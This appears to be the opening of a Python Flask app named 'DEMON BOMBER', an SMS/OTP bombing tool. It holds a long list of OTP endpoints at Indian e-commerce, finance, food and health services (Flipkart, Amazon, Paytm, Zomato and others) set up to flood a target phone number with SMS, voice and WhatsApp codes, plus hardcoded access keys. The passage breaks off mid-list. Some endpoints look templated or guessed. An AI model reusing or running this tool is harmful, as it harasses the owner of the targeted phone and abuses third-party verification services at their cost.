# app.py - DEMON BOMBER (FULL 250+ APIS FROM ALL FILES)
from flask import Flask, request, jsonify, render_template_string, Response
import requests
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ============ KEYS ============
VALID_KEYS = {"SHUVO": "shuvo2024", "FELIX": "felix2024"}

# ============ COMPLETE API LIST (ALL FILES MERGED) ============
APIS = []

# ============================================================
# FILE 1 APIS (api5.txt, apis1.txt se - 70+ APIS)
# ============================================================

file1_apis = [
    {"name": "SplexXO Bomb", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Agrevolution OTP", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": p, "client_id": "kisan-app"})},
    {"name": "Breeze OTP", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, "data": lambda p: json.dumps({"phoneNumber": p, "authVerificationType": "otp", "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"}, "countryCode": "+91"})},
    {"name": "Jockey SMS", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}, "data": None},
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}, "data": None},
    {"name": "PenPencil OTP", "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p, "countryCode": "+91", "subOrgId": "SUB-PWLI000"})},
    {"name": "Zoho OTP", "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", "method": "POST", "headers": {"Content-Length": "0", "User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "KPN Fresh SMS", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": {"country_code": "+91", "number": p}})},
    {"name": "KPN Fresh WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: json.dumps({"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": p}})},
    {"name": "KPN Fresh WEB", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": {"number": p, "country_code": "+91"}})},
    {"name": "Aditya Birla OTP", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"MobileNumber={p}&functionality=signup"},
    {"name": "Muthoot Finance", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile={p}&pin=XjtYYEdhP0haXjo3"},
    {"name": "GoPaySense OTP", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "IIFL OTP", "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"apply_for=18&full_name=Test&mobile_number={p}&terms_and_condition=1"},
    {"name": "BankOpen OTP", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"username": p, "is_open_capital": 1})},
    {"name": "Tata Capital OTP", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": p}})},
    {"name": "TradeIndia OTP", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": f"+91{p}"})},
    {"name": "Khatabook OTP", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "country_code": "+91", "app_signature": "wk+avHrHZf2"})},
    {"name": "OrangeHealth OTP", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": p, "customer_auto_fetch_message": True})},
    {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Mconnect OTP", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": f"+91{p}"})},
    {"name": "Astrosage OTP", "url": lambda p: f"https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={p}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"contact_number": p, "whatsapp": False, "code_len": 4})},
    {"name": "Dream11 OTP", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": p, "templateName": "default"})},
    {"name": "Citymall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": p})},
    {"name": "Codfirm OTP", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={p}&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "OYO OTP", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "country_code": "+91", "nod": 4})},
    {"name": "Myma OTP", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"countrycode": "+91", "mobile": f"91{p}", "is_otpgenerated": False, "app_version": "-1"})},
    {"name": "Freedo OTP", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"email_id": "test@test.com", "first_name": "Test", "mobile_number": p})},
    {"name": "Cosmofeed OTP", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p, "countryCode": "+91", "data": {"email": "test@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False})},
    {"name": "Bisleri OTP", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"email": "test@gmail.com", "mobile": p})},
    {"name": "Evital OTP", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"pharmacy_name": "Test", "mobile": p, "referral_code": "", "email_id": "test@gmail.com", "zip_code": "110086"})},
    {"name": "QuickRide OTP", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"contactNo={p}&countryCode=%2B91&appName=Quick%20Ride"},
    {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"is_otp": 1, "is_password": 0, "mobile": p})},
    {"name": "Hourlyrooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Madrasmandi OTP", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": f"+91{p}", "scope": "client"})},
    {"name": "BharatLoan OTP", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile={p}&current_page=login&is_existing_customer=2"},
    {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "language": 1})},
    {"name": "Vahak OTP", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": p, "scope": 0})},
    {"name": "Redcliffe OTP", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": p, "short": True})},
    {"name": "Ixigo OTP", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"sixDigitOTP=true&prefix=%2B91&phone={p}"},
    {"name": "55Club OTP", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": f"91{p}", "codeType": 1, "language": 0})},
    {"name": "Aakash OTP", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_psid": p, "mobile_number": "", "activity_type": "aakash-myadmission"})},
    {"name": "Testbook OTP", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Medibuddy OTP", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phonenumber": p, "platform": "medibuddy"})},
    {"name": "Woodenstreet OTP", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"firstname": "Test", "email": "test@test.com", "telephone": p, "password": "Test@123", "isGuest": 0, "pincode": "110001"})},
    {"name": "BikeFixup OTP", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "app_signature": "4pFtQJwcz6y"})},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"user": {"phone_number": f"+91{p}"}, "via": "whatsapp"})},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNo": p})},
    {"name": "Stratzy Phone OTP", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNo": p})},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"country_code": "+91", "phone": p})},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"payload": {"allowWhatsapp": True, "mobile": f"+91{p}"}, "type": "mobile"})},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"city": 362, "fullName": "", "phone": p, "source": "myaccount"})},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": f"+91{p}"})},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "country": "in"})},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": p, "resend_otp_request": True})},
    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"ad_id": "", "device_info": {}, "phone": p, "email": "test@gmail.com"})},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p, "whatsapp_opt_in": 1})},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"query": f"mutation {{SendOtp(input: {{mobile: \"{p}\",isdCode: \"91\",otpType: \"registerOtp\"}}) {{status {{message code}}}}}}"})},
]

# ============================================================
# FILE 2 APIS (apis2.txt se - Flipkart, Amazon, Paytm etc - 80+ APIS)
# ============================================================

file2_apis = [
    {"name": "Flipkart SMS", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Flipkart WhatsApp", "url": "https://flipkart.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Flipkart OTP", "url": "https://flipkart.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Flipkart Login", "url": "https://flipkart.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Amazon SMS", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&action=otp"},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "Amazon WhatsApp", "url": "https://amazon.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Amazon OTP", "url": "https://amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Amazon Pay SMS", "url": "https://pay.amazon.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Amazon Pay Voice", "url": "https://pay.amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Myntra SMS", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Myntra WhatsApp", "url": "https://myntra.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Ajio SMS", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Ajio Voice", "url": "https://ajio.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Ajio WhatsApp", "url": "https://ajio.com/v3/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Meesho SMS", "url": "https://meesho.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Meesho WhatsApp", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"number": p, "otpOnCall": True})},
    {"name": "Meesho Call", "url": "https://meesho.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "countryCode": "91"})},
    {"name": "Snapdeal SMS", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Snapdeal Call", "url": "https://snapdeal.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Paytm SMS", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "loginData": "LOGIN_USING_PHONE"})},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Paytm WhatsApp", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "PhonePe SMS", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "PhonePe Voice", "url": "https://phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "PhonePe WhatsApp", "url": "https://phonepe.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Google Pay SMS", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Google Pay Voice", "url": "https://pay.google.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Google Pay WhatsApp", "url": "https://pay.google.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Swiggy SMS", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Swiggy WhatsApp", "url": "https://swiggy.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Zomato SMS", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}"},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "Zomato WhatsApp", "url": "https://zomato.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Dominos SMS", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"PhoneNo={p}"},
    {"name": "Dominos Voice", "url": "https://dominos.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Pizza Hut SMS", "url": "https://www.pizzahut.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Pizza Hut Voice", "url": "https://pizzahut.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "KFC SMS", "url": "https://www.kfc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "KFC Voice", "url": "https://kfc.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Burger King SMS", "url": "https://www.burgerking.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Burger King Voice", "url": "https://burgerking.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "BigBasket SMS", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile_number": p})},
    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "BigBasket WhatsApp", "url": "https://bigbasket.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Zepto SMS", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Zepto Voice", "url": "https://zepto.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
